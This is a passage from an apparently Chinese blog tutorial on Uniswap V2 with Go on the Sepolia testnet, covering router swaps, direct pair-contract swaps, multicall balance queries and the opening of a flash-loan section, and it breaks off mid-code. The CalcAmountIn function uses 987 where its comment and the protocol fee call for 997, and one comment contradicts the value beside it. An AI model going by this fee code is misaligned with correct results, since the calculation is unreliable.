固定输入数量，要支付的token</span><br><span class="hljs-comment">//amountOutMin := new(big.Int).Mul(big.NewInt(1), big.NewInt(1e15)) // 2  最小输出金额，最低得到的金额，如果没有满足则交易失败</span><br><span class="hljs-comment">// 上一个已经寻过价了，此处省略询价的步骤。。。。</span><br><span class="hljs-comment">//SwapExactTokensForETH(opts *bind.TransactOpts, amountIn *big.Int, amountOutMin *big.Int, path []common.Address, to common.Address, deadline *big.Int)</span><br><span class="hljs-comment">//tx, err := routerInstance.SwapExactTokensForETH(auth, amountIn, amountOutMin, path, auth.From, deadline)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatalf(&quot;SwapExactTokensForETH err: %v&quot;, err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//* SwapExactTokensForTokens用固定数量的输入代币，换取尽可能多的输出代币，限制一个最小得到金额</span><br><span class="hljs-comment">//router.SwapExactTokensForTokens()</span><br><span class="hljs-comment">// 指定对应的代币合约去多跳，这里演示USDT 换成BTC</span><br><span class="hljs-comment">//path := []common.Address&#123;USDT, WETH, BTC&#125; // 路径是 USDT--&gt;WETH--&gt;BTC</span><br><span class="hljs-comment">//planAmountIn := new(big.Int).Mul(big.NewInt(1), big.NewInt(1e18)) // 1  固定数量的输入代币,就是你要付出的多少个金额，是path的第一个</span><br><span class="hljs-comment">//expectamountOut, err := routerInstance.GetAmountsOut(&amp;bind.CallOpts&#123;&#125;, planAmountIn, path)</span><br><span class="hljs-comment">//fmt.Printf(&quot;amountsIn USDT=%d\n&quot;, expectamountOut[0])   // 是输入代币数量（你传入的 amountIn）//amountsIn USDT=1000000000000000000</span><br><span class="hljs-comment">//fmt.Printf(&quot;amountsOut WETH =%d\n&quot;, expectamountOut[1]) // 由第一个换成第二个的得到的数量//amountsOut WETH =99600698103990</span><br><span class="hljs-comment">//fmt.Printf(&quot;amountsOut BTC =%d\n&quot;, expectamountOut[2])  // 由第二个换成第三个的得到的数量，amounts[len(path)-1] 是最终输出代币的数量（你能拿到的目标代币数量）</span><br><span class="hljs-comment">//amountsOut BTC =16036488252549356056922--&gt;询价结果 1603</span><br><span class="hljs-comment">// 授权</span><br><span class="hljs-comment">//approveAmount := new(big.Int).Mul(big.NewInt(100), big.NewInt(1e18)) // 1  固定数量的输入代币,就是你要付出的多少个金额，是path的第一个</span><br><span class="hljs-comment">//approveTx, err := usdtInstance.Approve(auth, routerAddress, approveAmount)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatalf(&quot;approveTx err: %v&quot;, err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//fmt.Printf(&quot;approveTx tx sent: https://sepolia.abscan.org/tx/%s\n&quot;, approveTx.Hash().Hex())</span><br><span class="hljs-comment">//time.Sleep(5)</span><br><span class="hljs-comment">// approveTx tx sent: https://sepolia.abscan.org/tx/0x9c55f882628bdd2912b9b3bbe35100194f8529718a184f9be0ec98e1ff2f5da8</span><br><span class="hljs-comment">//testAmountOutMin := new(big.Int).Mul(big.NewInt(2), big.NewInt(1e18)) // 1  固定数量的输入代币,就是你要付出的多少个金额，是path的第一个</span><br><span class="hljs-comment">// 在调用SwapExactTokensForTokens之前，最好先询价，还有一定要先授权</span><br><span class="hljs-comment">// 源码：SwapExactTokensForTokens(opts *bind.TransactOpts, amountIn *big.Int, amountOutMin *big.Int, path []common.Address, to common.Address, deadline *big.Int)</span><br><span class="hljs-comment">//tx, err := routerInstance.SwapExactTokensForTokens(auth, planAmountIn, testAmountOutMin, path, auth.From, deadline)</span><br><span class="hljs-comment">// SwapExactTokensForTokens结果Swap tx sent: https://sepolia.abscan.org/tx/0x25f65c0ac3bef912ae1a169ed4eedfb36c21ca933579aaa95179386afc48547f</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatalf(&quot;SwapExactTokensForTokens err: %v&quot;, err)</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-comment">//* SwapTokensForExactTokens用尽可能少的输入代币，换取固定数量的输出代币，就是指定得到的金额，然后指定一个最大的付出金额</span><br><span class="hljs-comment">// 源码：SwapTokensForExactTokens(opts *bind.TransactOpts, amountOut *big.Int, amountInMax *big.Int, path []common.Address, to common.Address, deadline *big.Int)</span><br><span class="hljs-comment">//amountOut := new(big.Int).Mul(big.NewInt(1), big.NewInt(1e18))   // 1  固定数量的输出代币,就是你要得到多少个金额，</span><br><span class="hljs-comment">//amountInMax := new(big.Int).Mul(big.NewInt(1), big.NewInt(1e18)) // 1  最大输入代币,就是你要最多付出的多少个金额，</span><br><span class="hljs-comment">//tx, err := routerInstance.SwapTokensForExactTokens(auth, amountOut, amountInMax, path, auth.From, deadline)</span><br><span class="hljs-comment">// 交易结果Swap tx sent: https://sepolia.abscan.org/tx/0x2d53775319ec0566edfda926cc8162ad8a7023f9dd4ae9e84230797016adfa13</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatalf(&quot;SwapTokensForExactTokens err: %v&quot;, err)</span><br><span class="hljs-comment">//&#125;</span><br><br>fmt.Printf(<span class="hljs-string">&quot;Swap tx sent: https://sepolia.abscan.org/tx/%s\n&quot;</span>, tx.Hash().Hex())<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="第二种方式，通过直接调用Pair合约的swap方法"><a href="#第二种方式，通过直接调用Pair合约的swap方法" class="headerlink" title="第二种方式，通过直接调用Pair合约的swap方法"></a>第二种方式，通过直接调用Pair合约的swap方法</h2><p>下面是 Uniswap V2 Pair 合约中 <code>swap</code> 方法的参数详细介绍：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">Swap(<br>    opts *bind.TransactOpts,<br>    amount0Out *big.Int,<br>    amount1Out *big.Int,<br>    to common.Address,<br>    data []<span class="hljs-type">byte</span>,<br>)<br></code></pre></td></tr></table></figure><h3 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h3><table><thead><tr><th>参数名</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td><code>opts</code></td><td><code>*bind.TransactOpts</code></td><td>交易调用选项，包含调用者地址、gas限制、gas价格、发送的ETH等。</td></tr><tr><td><code>amount0Out</code></td><td><code>*big.Int</code></td><td>本次交易中，从池子中输出（发送给 <code>to</code> 地址）的 Token0 数量。</td></tr><tr><td><code>amount1Out</code></td><td><code>*big.Int</code></td><td>本次交易中，从池子中输出（发送给 <code>to</code> 地址）的 Token1 数量。</td></tr><tr><td><code>to</code></td><td><code>common.Address</code></td><td>接收输出代币的地址。</td></tr><tr><td><code>data</code></td><td><code>[]byte</code></td><td>附加数据，一般为空。若非空，则触发闪电贷回调（<code>uniswapV2Call</code>）。</td></tr></tbody></table><h3 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h3><h3 id="1-opts-bind-TransactOpts"><a href="#1-opts-bind-TransactOpts" class="headerlink" title="1. opts *bind.TransactOpts"></a>1. <code>opts *bind.TransactOpts</code></h3><ul><li>这是 go-ethereum 绑定合约调用时的交易参数结构体。</li><li>包含：<ul><li>发起交易的账户地址（<code>From</code>）</li><li>交易的 gas 限制、gas 价格</li><li>发送的 ETH 数量（一般 swap 不需要额外发送 ETH）</li></ul></li><li>你需要先用私钥或钱包生成它。</li></ul><h3 id="2-amount0Out-big-Int"><a href="#2-amount0Out-big-Int" class="headerlink" title="2. amount0Out *big.Int"></a>2. <code>amount0Out *big.Int</code></h3><ul><li>这次交易你想从池子里“拿出”的 Token0 数量（即池子向你转出的 Token0）。</li><li>如果这次交易你不想拿 Token0，填 0。</li></ul><h3 id="3-amount1Out-big-Int"><a href="#3-amount1Out-big-Int" class="headerlink" title="3. amount1Out *big.Int"></a>3. <code>amount1Out *big.Int</code></h3><ul><li>这次交易你想从池子里“拿出”的 Token1 数量（即池子向你转出的 Token1）。</li><li>如果这次交易你不想拿 Token1，填 0。</li></ul><p><strong>注意：</strong> 这两个参数不能同时为 0，必须至少输出一种代币。</p><h3 id="4-to-common-Address"><a href="#4-to-common-Address" class="headerlink" title="4. to common.Address"></a>4. <code>to common.Address</code></h3><ul><li>代币输出的接收地址，通常是你的钱包地址或者合约地址。</li><li>交易成功后，池子会把对应的代币转给这个地址。</li></ul><h3 id="5-data-byte"><a href="#5-data-byte" class="headerlink" title="5. data []byte"></a>5. <code>data []byte</code></h3><ul><li>附加数据，通常为空。</li><li>如果非空，表示调用闪电贷（flash swap）功能，调用方需要实现 <code>uniswapV2Call</code> 回调函数，完成借贷逻辑并归还资金。</li><li>一般普通 swap 交易传空即可。</li></ul><hr><h3 id="总结调用逻辑"><a href="#总结调用逻辑" class="headerlink" title="总结调用逻辑"></a>总结调用逻辑</h3><ul><li><strong>先把你要用来交换的输入代币转账给 Pair 合约地址（调用前转账）</strong></li><li>调用 <code>swap</code>，告诉合约你想从池子中取多少输出代币（<code>amount0Out</code> 或 <code>amount1Out</code>）</li><li>合约会检查输入代币数量是否满足恒定乘积公式（含手续费）</li><li>如果满足，合约会把输出代币转给 <code>to</code> 地址，交易成功</li><li>如果不满足，交易回滚</li></ul><hr><p>好的！关于 <code>amount0Out</code> 和 <code>amount1Out</code> 这两个参数的传递，理解它们的含义和如何计算非常关键。下面我帮你详细讲解：</p><hr><h4 id="一、amount0Out-和-amount1Out-的含义"><a href="#一、amount0Out-和-amount1Out-的含义" class="headerlink" title="一、amount0Out 和 amount1Out 的含义"></a>一、<code>amount0Out</code> 和 <code>amount1Out</code> 的含义</h4><ul><li>它们表示<strong>你希望从池子里“拿出”多少代币</strong>。</li><li><code>amount0Out</code> 是从池子中输出（转给你）Token0 的数量。</li><li><code>amount1Out</code> 是从池子中输出（转给你）Token1 的数量。</li><li><strong>这两个参数不能同时为 0</strong>，必须至少输出一种代币。</li></ul><p>例如：</p><ul><li>如果你想用 Token0 换取 Token1，那么你希望<strong>从池子拿出 Token1</strong>，所以 <code>amount1Out</code> 是你想拿的 Token1 数量，<code>amount0Out</code> 设为 0。</li><li>反之，如果你想用 Token1 换 Token0，则 <code>amount0Out</code> 是你想拿的 Token0 数量，<code>amount1Out</code> 设为 0。</li></ul><hr><h4 id="二、如何确定-amount0Out-或-amount1Out-的具体数值？"><a href="#二、如何确定-amount0Out-或-amount1Out-的具体数值？" class="headerlink" title="二、如何确定 amount0Out 或 amount1Out 的具体数值？"></a>二、如何确定 <code>amount0Out</code> 或 <code>amount1Out</code> 的具体数值？</h4><h5 id="1-你想拿多少代币？"><a href="#1-你想拿多少代币？" class="headerlink" title="1. 你想拿多少代币？"></a>1. 你想拿多少代币？</h5><ul><li>这是你交易的目标，比如你想换 10 个 Token1，<code>amount1Out = 10 * 10^decimals</code>（注意代币的精度）。</li><li>或者你想拿 5 个 Token0，<code>amount0Out = 5 * 10^decimals</code>。</li></ul><h5 id="2-你必须保证输入代币数量足够支付输出代币（含手续费）"><a href="#2-你必须保证输入代币数量足够支付输出代币（含手续费）" class="headerlink" title="2. 你必须保证输入代币数量足够支付输出代币（含手续费）"></a>2. 你必须保证输入代币数量足够支付输出代币（含手续费）</h5><p>Uniswap V2 使用恒定乘积公式：</p><p>(x+Δx)×(y−Δy)≥x×y(<em>x</em>+Δ<em>x</em>)×(<em>y</em>−Δ<em>y</em>)≥<em>x</em>×<em>y</em></p><p>其中：</p><ul><li>x,y<em>x</em>,<em>y</em> 是池子中 Token0 和 Token1 的当前储备量</li><li>ΔxΔ<em>x</em> 是你输入的 Token0 数量</li><li>ΔyΔ<em>y</em> 是你输出的 Token1 数量（即 <code>amount1Out</code>）</li></ul><p>Uniswap V2 还扣除 0.3% 交易手续费，实际上计算公式是：</p><p>(x+Δx×0.997)×(y−Δy)≥x×y(<em>x</em>+Δ<em>x</em>×0.997)×(<em>y</em>−Δ<em>y</em>)≥<em>x</em>×<em>y</em></p><hr><h5 id="3-计算示例（用-Token0-换-Token1）"><a href="#3-计算示例（用-Token0-换-Token1）" class="headerlink" title="3. 计算示例（用 Token0 换 Token1）"></a>3. 计算示例（用 Token0 换 Token1）</h5><p>假设：</p><ul><li>池子储备：<code>reserve0 = 1000 Token0</code>, <code>reserve1 = 500 Token1</code></li><li>你想拿出 <code>amount1Out = 10 Token1</code></li></ul><p>计算你需要输入多少 Token0：</p><p>Δx&#x3D;x×Δy(y−Δy)×0.997+1Δ<em>x</em>&#x3D;(<em>y</em>−Δ<em>y</em>)×0.997<em>x</em>×Δ<em>y</em>+1</p><p>代入数值：</p><p>Δx&#x3D;1000×10(500−10)×0.997+1≈10000490×0.997+1≈10000488.53+1≈20.47+1&#x3D;21.47Δ<em>x</em>&#x3D;(500−10)×0.9971000×10+1≈490×0.99710000+1≈488.5310000+1≈20.47+1&#x3D;21.47</p><p>所以你需要输入约 22 个 Token0（向上取整），才能换出 10 个 Token1。</p><hr><h5 id="4-交易流程"><a href="#4-交易流程" class="headerlink" title="4. 交易流程"></a>4. 交易流程</h5><ul><li>你先把约 22 个 Token0 转给 Pair 合约地址</li><li>调用 <code>swap(0, 10, yourAddress, [])</code>，告诉合约你想拿 10 个 Token1</li><li>合约检查输入的 Token0 是否足够满足恒定乘积公式</li><li>如果满足，合约把 10 个 Token1 转给你，交易成功</li></ul><hr><h4 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h4><table><thead><tr><th>情况</th><th>amount0Out</th><th>amount1Out</th><th>说明</th></tr></thead><tbody><tr><td>用 Token0 换 Token1</td><td>0</td><td>你想拿的 Token1 数量</td><td>输出 Token1，输入 Token0</td></tr><tr><td>用 Token1 换 Token0</td><td>你想拿的 Token0 数量</td><td>0</td><td>输出 Token0，输入 Token1</td></tr><tr><td>两个都不为 0（闪电贷场景）</td><td>非 0</td><td>非 0</td><td>复杂操作，需实现回调接口</td></tr><tr><td>两个都为 0</td><td>不允许</td><td>不允许</td><td>交易无意义，合约会拒绝</td></tr></tbody></table><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-comment">// SwapTokenOnPair 在我创建的币对合约做swap ，两种方式，这里是第二种，通过直接调用我的币对合约</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SwapTokenOnPair</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 在我创建的币对合约做swap ，两种方式，这里是第二种，通过直接调用我的币对合约</span><br>pairInstance := getPair()<br>usdtInstance := getUsdt()<br>client := ethereumcli.GetEthClient()<br><br>pairAddress := common.HexToAddress(<span class="hljs-string">&quot;0x5c1080c5180aa87688d4064facbf7a4520bf2339&quot;</span>)<br><br>auth := getAuth()<br><br>amount0Out := big.NewInt(<span class="hljs-number">0</span>)                                     <span class="hljs-comment">// 1  想得到Token0 USDT的数量是0</span><br>amount1Out := <span class="hljs-built_in">new</span>(big.Int).Mul(big.NewInt(<span class="hljs-number">1</span>), big.NewInt(<span class="hljs-number">1e15</span>)) <span class="hljs-comment">// 2 想得到Token1 WETH 的数量是0</span><br>fmt.Printf(<span class="hljs-string">&quot;期望得到的amount1的数量为：%d&quot;</span>, amount1Out)<br>amountIn := CalcAmountIn(amount1Out)<br>fmt.Printf(<span class="hljs-string">&quot;必须要转入的amountIn的数量为：%d&quot;</span>, amountIn)<br><br><span class="hljs-comment">// 通过计算期望输出金额来确定该转账的金额</span><br>txTr, err := usdtInstance.Transfer(auth, pairAddress, amountIn)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Transfer err: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 等待转账交易确认</span><br>receipt, err := waitTxConfirm(client, txTr.Hash())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Transfer tx confirmation err: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> receipt.Status != <span class="hljs-number">1</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Transfer tx failed&quot;</span>)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;Transfer confirmed, proceed to swap&quot;</span>)<br>fmt.Printf(<span class="hljs-string">&quot;Swap tx sent: https://sepolia.abscan.org/tx/%s\n&quot;</span>, txTr.Hash().Hex())<br>fmt.Println(<span class="hljs-string">&quot;转账已完毕，正在进行Swap&quot;</span>)<br><br><span class="hljs-comment">//Swap(opts *bind.TransactOpts, amount0Out *big.Int, amount1Out *big.Int, to common.Address, data []byte)</span><br><span class="hljs-keyword">var</span> data []<span class="hljs-type">byte</span> <span class="hljs-comment">// 普通 swap 传空</span><br><span class="hljs-comment">// 在直接调用swap之前必须要先给合约转账</span><br>tx, err := pairInstance.Swap(auth, amount0Out, amount1Out, auth.From, data)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Swap err: %v&quot;</span>, err)<br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;Swap tx sent: https://sepolia.abscan.org/tx/%s\n&quot;</span>, tx.Hash().Hex())<br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CalcAmountIn</span><span class="hljs-params">(amountOut *big.Int)</span></span> *big.Int &#123;<br>pairInstance := getPair()<br>token0Address, err := pairInstance.Token0(&amp;bind.CallOpts&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Token0 Query err: %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;token0Address =%s\n&quot;</span>, token0Address)<br><span class="hljs-comment">// token0Address =0x58278ebb4EbFA82ebF183E4CdEc1968391e59b6C  ===&gt;USDT</span><br>token0Name := <span class="hljs-string">&quot;USDT&quot;</span><br>token1Address, err := pairInstance.Token1(&amp;bind.CallOpts&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Token1 Query err: %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;token1Address =%s\n&quot;</span>, token1Address)<br><span class="hljs-comment">// token1Address =0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d ===&gt;WETH</span><br>token1Name := <span class="hljs-string">&quot;WETH&quot;</span><br><br>reserves, err := pairInstance.GetReserves(&amp;bind.CallOpts&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;GetReserves Query err: %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;token0 %s 的储备为 %d\n&quot;</span>, token0Name, reserves.Reserve0)<br>fmt.Printf(<span class="hljs-string">&quot;token1 %s 的储备为 %d\n&quot;</span>, token1Name, reserves.Reserve1)<br><br>numerator := <span class="hljs-built_in">new</span>(big.Int).Mul(reserves.Reserve0, amountOut) <span class="hljs-comment">// reserveIn * amountOut</span><br>numerator.Mul(numerator, big.NewInt(<span class="hljs-number">1000</span>))                  <span class="hljs-comment">// * 1000</span><br><br>denominator := <span class="hljs-built_in">new</span>(big.Int).Mul(reserves.Reserve1, big.NewInt(<span class="hljs-number">987</span>)) <span class="hljs-comment">// reserveOut * 997</span><br><br>amountIn := <span class="hljs-built_in">new</span>(big.Int).Div(numerator, denominator)<br><span class="hljs-keyword">return</span> amountIn<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="7、批量查询池子流动性获取价格"><a href="#7、批量查询池子流动性获取价格" class="headerlink" title="7、批量查询池子流动性获取价格"></a>7、批量查询池子流动性获取价格</h1><p>前面已经知道了可以使用 池子合约的pairInstance.GetReserves()方法查询池子当前储备量，但是如果要查询多个池子的话，就需要发起多条请求，很不方便，</p><p>可以通过编写Multicall合约批量查询池子的储备量，</p><p>下面是Multicall合约批量查询某地址某ERC20合约代币余额的实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs solidity">func Multicaller() &#123;<br>client := ethereumcli.GetEthClient()<br>multicallAddress := common.HexToAddress(&quot;0xEf017FE26B1f9dcA9D15824e574653897A67daaf&quot;)<br>//usdtInstance := getUsdt()<br>//autn := getAuth()<br><br>multicallInstance, err := multicall.NewMulticall(multicallAddress, client)<br>if err != nil &#123;<br>log.Fatal(err)<br>&#125;<br><br>usdtABI, err := abi.JSON(strings.NewReader(usdt.UsdtMetaData.ABI))<br>if err != nil &#123;<br>log.Fatal(err)<br>&#125;<br><br>usdtAddress := common.HexToAddress(&quot;0x58278ebb4EbFA82ebF183E4CdEc1968391e59b6C&quot;)<br>// 要查询的两个地址，放在一个列表/数组里面，等下直接用<br>addresses := []common.Address&#123;<br>common.HexToAddress(&quot;0x4c9379162D35A3431D21a2a443B2E46e5913265b&quot;),<br>common.HexToAddress(&quot;0x0bCE5f4bC3fE031517BEdE917315142078235A28&quot;),<br>&#125;<br>var calls []multicall.MulticallCall // MulticallCall就是入参的结构体<br>// 遍历地址列表<br>for _, addr := range addresses &#123;<br>// 生成 callData ,使用ERC20的合约(你要调用的合约)绑定的Pack方法生成对应的callData<br>callData, err := usdtABI.Pack(&quot;balanceOf&quot;, addr)<br>if err != nil &#123;<br>log.Fatalf(&quot;pack balanceOf failed: %v&quot;, err)<br>&#125;<br>calls = append(calls, multicall.MulticallCall&#123;<br>Target:       usdtAddress,<br>AllowFailure: false,<br>CallData:     callData,<br>&#125;)<br>&#125;<br>// 调用 multicall<br>results, err := multicallInstance.Multicall(&amp;bind.CallOpts&#123;&#125;, calls)<br>if err != nil &#123;<br>log.Fatalf(&quot;multicall call failed: %v&quot;, err)<br>&#125;<br>//results.Data()<br>// 解析结果<br>for i, res := range results &#123;<br>if !res.Success &#123;<br>fmt.Printf(&quot;Call failed for address %s\n&quot;, addresses[i].Hex())<br>continue<br>&#125;<br>if len(res.ReturnData) == 0 &#123;<br>fmt.Printf(&quot;err Empty return data for address %s\n&quot;, addresses[i].Hex())<br>continue<br>&#125;<br>var balance *big.Int<br>err := usdtABI.UnpackIntoInterface(&amp;balance, &quot;balanceOf&quot;, res.ReturnData)<br>if err != nil &#123;<br>fmt.Printf(&quot;unpack balance failed for %s: %v\n&quot;, addresses[i].Hex(), err)<br>continue<br>&#125;<br>fmt.Printf(&quot;Address %s balance: %s\n&quot;, addresses[i].Hex(), balance.String())<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="8、闪电贷"><a href="#8、闪电贷" class="headerlink" title="8、闪电贷"></a>8、闪电贷</h1><h2 id="闪电贷的原理"><a href="#闪电贷的原理" class="headerlink" title="闪电贷的原理"></a>闪电贷的原理</h2><p>允许用户在调用UniswapV2 Pair合约的swap函数时借用代币，在此笔交易结束时，合约会检查用户是否偿还了<strong>这笔钱</strong><code>（这笔钱=借款金额+手续费）</code>，如果<strong>没有偿还这笔钱</strong>，这笔交易将会回滚，你无法完成swap</p><h2 id="闪电贷的实现"><a href="#闪电贷的实现" class="headerlink" title="闪电贷的实现"></a>闪电贷的实现</h2><p>在 Uniswap V2 中，闪电贷是通过 <code>swap</code> 方法实现的。<code>swap</code> 方法有一个 <code>data</code> 参数，允许用户在交易中执行自定义逻辑。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// pair 合约的swap方法<br>function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;<br>//.......省略源代码<br>if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);<br>//.......省略源代码<br>&#125;<br>//amount0Out 和 amount1Out：分别表示要借用的 Token0 和 Token1 的数量。只能有一个为非零值。<br>to：接收借用代币的地址。<br>data：如果 data 为空，执行普通的 swap；如果 data 不为空，执行闪电贷逻辑。<br></code></pre></td></tr></table></figure><p>amount0Out 和 amount1Out：分别表示要借用的 Token0 和 Token1 的数量。只能有一个为非零值。<br>to：接收借用代币的地址。<br>data：如果 data 为空，执行普通的 swap；如果 data 不为空，执行闪电贷逻辑。</p><h2 id="闪电贷的工作流程"><a href="#闪电贷的工作流程" class="headerlink" title="闪电贷的工作流程"></a>闪电贷的工作流程</h2><ol><li><strong>借用代币</strong>：用户调用 <code>swap</code> 方法，指定 <code>amount0Out</code> 或 <code>amount1Out</code> 借用代币数量，并提供自定义逻辑的 <code>data</code>。</li><li><strong>执行自定义逻辑</strong>：如果 <code>data</code> 不为空，合约会调用 <code>to</code> 地址的 <code>uniswapV2Call</code> 方法，传递借用的代币数量和其他信息。</li><li><strong>偿还借用</strong>：在 <code>uniswapV2Call</code> 方法中，用户执行自定义逻辑（例如套利交易），并确保在交易结束前偿还借用的代币及相应费用。</li><li><strong>检查偿还</strong>：交易结束时，合约会检查是否偿还了借用的代币及费用。如果没有，交易回滚。</li></ol><p>所以我们需要自己写一个闪电贷合约，里面写好uniswapV2Call回调函数</p><h2 id="闪电贷代码"><a href="#闪电贷代码" class="headerlink" title="闪电贷代码"></a>闪电贷代码</h2><p>逻辑相对来说比较复杂，需要仔细看代码的注释</p><p>使用的逻辑大概就是用户地址—–&gt;调用闪电贷合约的flashSwap函数—–&gt;flashSwap函数会调用币对pair合约的swap方法—-&gt;币对pair合约的swap方法会回调闪电贷合约的uniswapV2Call方法进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 